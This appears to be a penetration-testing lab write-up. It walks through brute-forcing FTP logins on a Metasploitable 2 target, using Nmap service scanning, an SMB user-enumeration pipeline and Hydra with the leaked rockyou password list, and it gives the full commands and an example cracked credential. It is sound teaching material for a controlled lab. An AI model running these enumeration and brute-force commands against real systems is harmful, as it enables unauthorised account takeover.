# Hydra Brute Force Attack using RockYou Wordlist

## Lab Environment

Attacker Machine: Kali Linux  
Target Machine: Metasploitable 2  
Attack Tool: Hydra  
Wordlist: rockyou.txt  

---

## About rockyou.txt Wordlist

rockyou.txt is a commonly used password wordlist in cybersecurity. It contains over 14 million real passwords leaked from a data breach. It is used in penetration testing to perform brute force attacks by trying many password combinations.

Default location in Kali Linux:

/usr/share/wordlists/

---

## Step 1: Locate rockyou wordlist

Navigate to the wordlists directory:

ls /usr/share/wordlists/

You will see:

rockyou.txt.gz

This file is compressed.

---

## Step 2: Extract rockyou.txt

Run:

sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

Now rockyou.txt is ready to use.

Verify:

ls /usr/share/wordlists/

---

## Step 3: Identify open services on target system

Before performing a brute force attack, identify open services using Nmap:

nmap 10.0.2.9

Common services that support authentication include:

- FTP (Port 21) – File Transfer Protocol login  
- SSH (Port 22) – Secure Shell remote login  
- HTTP/HTTPS (Port 80/443) – Web application login  
- SMB (Port 445) – File sharing authentication  
- Telnet (Port 23) – Remote terminal login  

---

## Step 4: Enumerate usernames from target system

Run the SMB enumeration script:

nmap --script=smb-enum-users.nse -p 445 10.0.2.9 | grep "Full name" | cut -d " " -f 10 > users.txt

This creates a file named users.txt containing usernames.

Verify usernames:

cat users.txt

---

## Step 5: Perform brute force attack using Hydra

Run:

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ftp://10.0.2.9 -o results.txt

Explanation:

- -L users.txt → username list obtained from enumeration  
- -P rockyou.txt → password wordlist  
- ftp://10.0.2.9 → target FTP service  
- -o results.txt → saves successful login results  

---

## Step 6: View results

Display the results:

cat results.txt

Example output:

login: msfadmin password: msfadmin

This indicates valid credentials were found.

---

## Tools Used

- Kali Linux  
- Nmap  
- Hydra  
- rockyou.txt wordlist  

---

## Attack Workflow Summary

1. Locate and extract rockyou.txt wordlist  
2. Identify open services using Nmap  
3. Enumerate usernames using SMB enumeration  
4. Perform brute force attack using Hydra  
5. Analyze results  

---

## Purpose

This project demonstrates enumeration and brute force attack techniques used in cybersecurity penetration testing labs. It helps understand authentication vulnerabilities and password security in a controlled environment.
